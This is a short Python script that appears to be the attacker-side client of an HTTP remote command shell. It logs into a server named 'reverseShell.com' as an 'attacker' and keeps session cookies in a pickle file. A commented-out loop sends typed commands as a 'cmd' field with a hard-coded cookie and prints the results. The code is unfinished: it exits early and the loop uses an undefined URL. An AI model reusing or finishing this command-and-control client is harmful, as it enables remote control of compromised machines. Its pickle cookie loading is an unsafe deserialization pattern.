import requests
import logging
import pickle

def login(session, url, type):
    return session.request('GET', url, {'login':1, 'type':type})

# Try to load session cookies from file
def tryToLoadSessionCookies(session):
    # Try to load session cookies from file
    try:
        with open('cookies.dat', 'rb') as f:
            session.cookies.update(pickle.load(f))
    except FileNotFoundError:
        pass

# Save session cookies to file:
def writeSessionCookiesToFile(session):
    # Write cookies to file
    with open('cookies.dat', 'wb') as f:
        pickle.dump(session.cookies, f)


def main():
    # Module for connection debugging
    logging.basicConfig(level=logging.DEBUG)

    # Server domain
    baseUrl = 'http://www.reverseShell.com'

    # Store command
    data = {'cmd': None}

    # Start session
    with requests.session() as s:
        # Try to load session cookies from file
        tryToLoadSessionCookies(s)

        # Log in as attacker
        response = login(s, baseUrl + '/login.php', 'attacker')

        # Save session cookies to file
        writeSessionCookiesToFile(s)

        #print(s.cookies.get_dict())
        #print(response.content)
        print(response.text)

        exit()

        '''
        while True:
            try:
                # Read command
                data['cmd'] = input()
                # Send command
                #response = requests.request('POST', url, data=data, cookies={'__test': 'f1857067ff8936b46d925e9609d9c72c'})
                response = s.request('POST', url, data=data, cookies={'__test': 'f1857067ff8936b46d925e9609d9c72c'})
                # Print response
                print(response.text)
            # If hit Ctrl+c
            except KeyboardInterrupt:
                raise SystemExit

    #print(response.status_code, response.reason)
    #print(response.content)
    #print(response.text)
        '''

if __name__ == "__main__":
    main()
